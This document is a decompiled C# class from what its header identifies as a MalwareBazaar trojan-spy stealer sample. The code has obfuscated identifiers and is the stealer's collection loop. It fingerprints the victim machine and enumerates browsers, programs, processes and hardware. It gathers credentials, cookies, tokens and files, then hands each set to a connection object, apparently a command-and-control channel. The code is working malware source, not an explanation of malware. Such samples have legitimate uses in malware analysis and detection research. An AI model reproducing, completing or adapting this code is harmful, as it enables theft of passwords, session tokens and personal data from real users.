// Decompiled with JetBrains decompiler
// Type: SystemNetBufferedReadStreamReadMoreAsyncdB
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

public class SystemNetBufferedReadStreamReadMoreAsyncdB : 
  SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ
{
  public SystemNetBufferedReadStreamReadMoreAsyncdB()
  {
    SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ.Main = new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG[15]
    {
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.asdk9345asd),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.asdk8jasd),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.ылв92р34выа),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.аловй),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.ыал8р45),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.ываш9р34),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.ывал8н34),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.вал93тфыв),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.вашу0л34),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.навева),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.ащы9р34),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.ыва83о4тфыв),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.askd435),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.asdasod9234oasd),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.длвап9345)
    };
    SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ.First = new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG[6]
    {
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.sdf934asd),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.asd44123),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.sdfi35sdf),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.sdfo8n234),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.asdkadu8),
      new SystemNetNetworkInformationUnicastIPAddressInformationCollectionG(SystemNetBufferedReadStreamReadMoreAsyncdB.fdfg9i3jn4)
    };
    Random rnd = new Random();
    SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ.Main = ((IEnumerable<SystemNetNetworkInformationUnicastIPAddressInformationCollectionG>) SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ.Main).OrderBy<SystemNetNetworkInformationUnicastIPAddressInformationCollectionG, int>((Func<SystemNetNetworkInformationUnicastIPAddressInformationCollectionG, int>) (x => rnd.Next())).ToArray<SystemNetNetworkInformationUnicastIPAddressInformationCollectionG>();
    SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ.First = ((IEnumerable<SystemNetNetworkInformationUnicastIPAddressInformationCollectionG>) SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ.First).OrderBy<SystemNetNetworkInformationUnicastIPAddressInformationCollectionG, int>((Func<SystemNetNetworkInformationUnicastIPAddressInformationCollectionG, int>) (x => rnd.Next())).ToArray<SystemNetNetworkInformationUnicastIPAddressInformationCollectionG>();
  }

  public override bool Invoker(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    return SystemNetBufferedReadStreamReadMoreAsyncdB.sdf9j3nasd(connection, settings, ref result);
  }

  public static bool sdf9j3nasd(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    try
    {
      result.Id7 = new SystemNetNetworkingPerfCountersCounterPairO()
      {
        Id2 = new List<string>(),
        Id6 = new List<SystemCodeDomCodeRegionDirectiveQ>(),
        Id7 = new List<SystemComponentModelCultureInfoConverterb>(),
        Id16 = new List<SystemNetConfigurationMailSettingsSectionGroupg>(),
        Id10 = new List<SystemNetConfigurationMailSettingsSectionGroupg>(),
        Id8 = new List<SystemNetSafeFreeCredentialSECURITYl>(),
        Id15 = new List<SystemNetConfigurationMailSettingsSectionGroupg>(),
        Id12 = new List<SystemComponentModelCultureInfoConverterb>(),
        Id13 = new List<SystemNetConfigurationMailSettingsSectionGroupg>(),
        Id4 = new List<string>(),
        Id14 = new List<SystemNetConfigurationMailSettingsSectionGroupg>(),
        Id9 = new List<SystemNetConfigurationMailSettingsSectionGroupg>(),
        Id11 = new List<SystemNetConfigurationMailSettingsSectionGroupg>(),
        Id1 = new List<string>(),
        Id3 = new List<string>(),
        Id5 = new List<SystemNetSocketsNetworkStreamb>()
      };
      result.Id11 = dnlibDotNetFnPtrSigb.GetDefaultIPv4Address();
      result.Id15 = SystemNetBufferedReadStreamReadMoreAsyncdB.Visible();
      result.PreCheck();
      foreach (SystemNetNetworkInformationUnicastIPAddressInformationCollectionG informationCollectionG in SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ.First)
      {
        try
        {
          informationCollectionG(connection, settings, ref result);
        }
        catch (InvalidOperationException ex)
        {
          throw ex;
        }
        catch (Exception ex)
        {
        }
      }
      if (connection.Id6(result) != SystemNetWinHttpWebProxyFinderp.Id2)
        throw new InvalidOperationException();
      SystemNetBufferedReadStreamReadMoreAsyncdB.LSIDsd2(connection, settings, ref result);
      while (!connection.Id25())
      {
        if (!connection.Id3())
          Thread.Sleep(1000);
      }
      return true;
    }
    catch (InvalidOperationException ex)
    {
      throw ex;
    }
    catch (Exception ex)
    {
      return false;
    }
  }

  public static bool Visible()
  {
    try
    {
      string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YaAddon");
      if (Directory.Exists(path))
      {
        if (!(new DirectoryInfo(path).CreationTime < DateTime.Now.AddMonths(-3)))
          return true;
        Directory.Delete(path);
        Directory.CreateDirectory(path);
        return false;
      }
      Directory.CreateDirectory(path);
      return false;
    }
    catch
    {
    }
    return false;
  }

  public static bool LSIDsd2(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    try
    {
      foreach (SystemNetNetworkInformationUnicastIPAddressInformationCollectionG informationCollectionG in SystemCollectionsGenericSortedDictionaryValueCollectioncDisplayClassQ.Main)
      {
        try
        {
          informationCollectionG(connection, settings, ref result);
        }
        catch (InvalidOperationException ex)
        {
          throw ex;
        }
        catch (Exception ex)
        {
        }
      }
      return true;
    }
    catch (InvalidOperationException ex)
    {
      throw ex;
    }
    catch (Exception ex)
    {
      return false;
    }
  }

  public static void asdkadu8(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    result.Id1 = dnlibDotNetPdbDssSymbolWriterImplF.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemCollectionsGenericSortedSetEqualityComparers.GetSerialNumber()).Replace("-", string.Empty);
  }

  public static void sdfo8n234(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    result.Id14 = Assembly.GetExecutingAssembly().Location;
  }

  public static void sdfi35sdf(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    result.Id5 = InputLanguage.CurrentInputLanguage.Culture.EnglishName;
    result.Id4 = SystemCollectionsGenericSortedSetEqualityComparers.GetWindowsVersion();
  }

  public static void asd44123(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    ref SystemMediaSoundPlayerp local = ref result;
    // ISSUE: reference to a compiler-generated field
    if (SystemNetBufferedReadStreamReadMoreAsyncdB.\u003C\u003Eo__8.\u003C\u003Ep__1 == null)
    {
      // ISSUE: reference to a compiler-generated field
      SystemNetBufferedReadStreamReadMoreAsyncdB.\u003C\u003Eo__8.\u003C\u003Ep__1 = CallSite<Func<CallSite, object, string>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.Convert(CSharpBinderFlags.None, typeof (string), typeof (SystemNetBufferedReadStreamReadMoreAsyncdB)));
    }
    // ISSUE: reference to a compiler-generated field
    Func<CallSite, object, string> target = SystemNetBufferedReadStreamReadMoreAsyncdB.\u003C\u003Eo__8.\u003C\u003Ep__1.Target;
    // ISSUE: reference to a compiler-generated field
    CallSite<Func<CallSite, object, string>> p1 = SystemNetBufferedReadStreamReadMoreAsyncdB.\u003C\u003Eo__8.\u003C\u003Ep__1;
    // ISSUE: reference to a compiler-generated field
    if (SystemNetBufferedReadStreamReadMoreAsyncdB.\u003C\u003Eo__8.\u003C\u003Ep__0 == null)
    {
      // ISSUE: reference to a compiler-generated field
      SystemNetBufferedReadStreamReadMoreAsyncdB.\u003C\u003Eo__8.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, object>>.Create(Microsoft.CSharp.RuntimeBinder.Binder.InvokeMember(CSharpBinderFlags.None, "ToString", (IEnumerable<System.Type>) null, typeof (SystemNetBufferedReadStreamReadMoreAsyncdB), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
      {
        CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
      }));
    }
    // ISSUE: reference to a compiler-generated field
    // ISSUE: reference to a compiler-generated field
    object obj = SystemNetBufferedReadStreamReadMoreAsyncdB.\u003C\u003Eo__8.\u003C\u003Ep__0.Target((CallSite) SystemNetBufferedReadStreamReadMoreAsyncdB.\u003C\u003Eo__8.\u003C\u003Ep__0, PrivateImplementationDetailsStaticArrayInitTypeSizej.MonitorSize());
    string str = target((CallSite) p1, obj);
    local.Id6 = str;
  }

  public static void fdfg9i3jn4(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    result.Id10 = TimeZoneInfo.Local.DisplayName;
  }

  public static void sdf934asd(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    result.Id3 = Environment.UserName;
  }

  public static void asdk9345asd(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    List<SystemNetSocketsNetworkStreamb> result1 = new List<SystemNetSocketsNetworkStreamb>();
    foreach (SystemNetSocketsNetworkStreamb processor in SystemCollectionsGenericSortedSetEqualityComparers.GetProcessors())
      result1.Add(processor);
    foreach (SystemNetSocketsNetworkStreamb graphicCard in SystemCollectionsGenericSortedSetEqualityComparers.GetGraphicCards())
      result1.Add(graphicCard);
    result1.Add(new SystemNetSocketsNetworkStreamb()
    {
      Id1 = new string(new char[12]
      {
        'T',
        'o',
        't',
        'a',
        'l',
        ' ',
        'o',
        'f',
        ' ',
        'R',
        'A',
        'M'
      }),
      Id3 = MicrosoftWinUnsafeNativeMethodsL.Id2,
      Id2 = SystemCollectionsGenericSortedSetEqualityComparers.CollectMemory()
    });
    int num = (int) connection.Id13(result1);
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.asdk9345asd(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void asdk8jasd(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    int num = (int) connection.Id14(SystemCollectionsGenericSortedSetEqualityComparers.GetBrowsers());
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.asdk8jasd(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void ылв92р34выа(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    int num = (int) connection.Id15(SystemCollectionsGenericSortedSetEqualityComparers.ListOfPrograms());
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.ылв92р34выа(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void аловй(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    dnlibDotNetTypeDefMDMethodOverrideTokensy methodOverrideTokensy = connection;
    List<string> vs = SystemCollectionsGenericSortedSetEqualityComparers.GetVs();
    List<string> result1 = vs != null ? vs.ToList<string>() : (List<string>) null;
    int num = (int) methodOverrideTokensy.Id10(result1);
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.аловй(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void ыал8р45(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    int num = (int) connection.Id20(SystemCollectionsGenericSortedSetEqualityComparers.ListOfProcesses());
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.ыал8р45(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void ываш9р34(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    int num = (int) connection.Id16(SystemCollectionsGenericSortedSetEqualityComparers.AvailableLanguages());
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.ываш9р34(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void длвап9345(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    if (!settings.Id5)
      return;
    int num = (int) connection.Id7(PrivateImplementationDetailsStaticArrayInitTypeSizej.GetImageBase());
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.длвап9345(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void ывал8н34(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    if (!settings.Id6)
      return;
    List<SystemNetConfigurationMailSettingsSectionGroupg> result1 = SystemNetSpnDictionaryE.Search((MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd) new SystemDiagnosticsOrdinalCaseInsensitiveComparerN());
    int num = (int) connection.Id24(result1);
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.ывал8н34(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void вал93тфыв(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    if (!settings.Id1)
      return;
    List<SystemCodeDomCodeRegionDirectiveQ> result1 = new List<SystemCodeDomCodeRegionDirectiveQ>();
    result1.AddRange((IEnumerable<SystemCodeDomCodeRegionDirectiveQ>) SystemNetCookieModuleI.Sсаn((IList<string>) settings.Id11));
    result1.AddRange((IEnumerable<SystemCodeDomCodeRegionDirectiveQ>) dnlibWResourcesWinResourcesUserk.Export((IList<string>) settings.Id12));
    int num = (int) connection.Id8(result1);
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.вал93тфыв(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void вашу0л34(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    if (!settings.Id2)
      return;
    int num = (int) connection.Id22(SystemNetUnsafeNclNativeMethodsOSSOCKTransmitFileBuffersStructX.Search((IEnumerable<string>) settings.Id10));
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.вашу0л34(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void навева(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    if (!settings.Id3)
      return;
    int num = (int) connection.Id12(SystemDataIDataReaderD.Enum());
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.навева(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void ащы9р34(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    if (!settings.Id4)
      return;
    MicrosoftSqlServerServerSmiContextY serverSmiContextY = new MicrosoftSqlServerServerSmiContextY();
    serverSmiContextY.Init((IList<string>) settings.Id11);
    List<SystemNetConfigurationMailSettingsSectionGroupg> result1 = SystemNetSpnDictionaryE.Search((MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd) new dnlibDotNetWriterSignatureWriterX(), (MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd) serverSmiContextY);
    result1.AddRange((IEnumerable<SystemNetConfigurationMailSettingsSectionGroupg>) dnlibDotNetPdbPdbImportTypek.Read((IEnumerable<SystemRuntimeInteropServicesStandardOleMarshalObjectN>) settings.Id13));
    int num = (int) connection.Id9(result1);
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.ащы9р34(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void ыва83о4тфыв(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    if (!settings.Id9)
      return;
    dnlibDotNetTypeDefMDMethodOverrideTokensy methodOverrideTokensy = connection;
    IEnumerable<SystemNetConfigurationMailSettingsSectionGroupg> tokens = SystemNetWebSocketsWebSocketProtocolComponentBufferTyper.GetTokens();
    List<SystemNetConfigurationMailSettingsSectionGroupg> result1 = tokens != null ? tokens.ToList<SystemNetConfigurationMailSettingsSectionGroupg>() : (List<SystemNetConfigurationMailSettingsSectionGroupg>) null;
    int num = (int) methodOverrideTokensy.Id11(result1);
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.ыва83о4тфыв(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void askd435(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    if (!settings.Id8)
      return;
    int num = (int) connection.Id23(SystemNetSpnDictionaryE.Search((MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd) new dnlibDotNetFileDefMDcDisplayClassv()));
    if (num == 2)
      SystemNetBufferedReadStreamReadMoreAsyncdB.askd435(connection, settings, ref result);
    if (num == 3)
      throw new InvalidOperationException();
  }

  public static void asdasod9234oasd(
    dnlibDotNetTypeDefMDMethodOverrideTokensy connection,
    dnlibDotNetWriterTablesHeapRawDummyRowU settings,
    ref SystemMediaSoundPlayerp result)
  {
    if (!settings.Id7)
      return;
    int num1 = (int) connection.Id18(SystemComponentModelRefreshPropertiesAttributel.Find());
    int num2 = (int) connection.Id19(SystemNetSpnDictionaryE.Search((MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd) new dnlibIOAlignedNativeMemoryDataStreamm()));
    int num3 = (int) connection.Id21(SystemNetSpnDictionaryE.Search((MicrosoftWinNativeMethodsMEMORYBASICINFORMATIONd) new SystemNetNetworkInformationPingcDisplayClassC()));
  }
}
